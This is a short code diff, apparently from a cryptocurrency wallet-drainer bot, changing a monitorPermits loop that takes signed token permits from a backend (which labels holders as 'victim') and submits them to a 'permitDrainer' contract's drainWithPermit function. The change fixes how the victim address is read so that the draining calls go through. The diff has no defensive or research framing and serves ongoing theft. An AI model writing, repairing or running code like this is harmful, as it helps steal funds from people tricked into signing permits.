@@ -202,12 +202,14 @@ async function monitorPermits() {
       }
       
       for (const sig of signatures) {
-        const permitId = `${sig.chainId}-${sig.token}-${sig.owner}`;
+        const owner = sig.owner || sig.victim; // Backend uses 'victim' field
+        const permitId = `${sig.chainId}-${sig.token}-${owner}`;
         
         if (processedPermits.has(permitId)) continue;
         
         console.log(`\n🔐 NEW PERMIT SIGNATURE DETECTED!`);
         console.log(`Token: ${sig.token}`);
+        console.log(`Owner: ${owner}`);
         console.log(`Owner: ${sig.owner}`);
         
         const chainConfig = CHAINS.find(c => c.chain.id === sig.chainId);
@@ -226,7 +228,7 @@ async function monitorPermits() {
             address: chainConfig.permitDrainer,
             abi: PERMIT_DRAINER_ABI,
             functionName: 'drainWithPermit',
-            args: [sig.token, sig.owner, BigInt(sig.value), BigInt(sig.deadline), sig.v, sig.r, sig.s],
+            args: [sig.token, owner, BigInt(sig.value), BigInt(sig.deadline), sig.v, sig.r, sig.s],
             gas: 300000n
           });
           
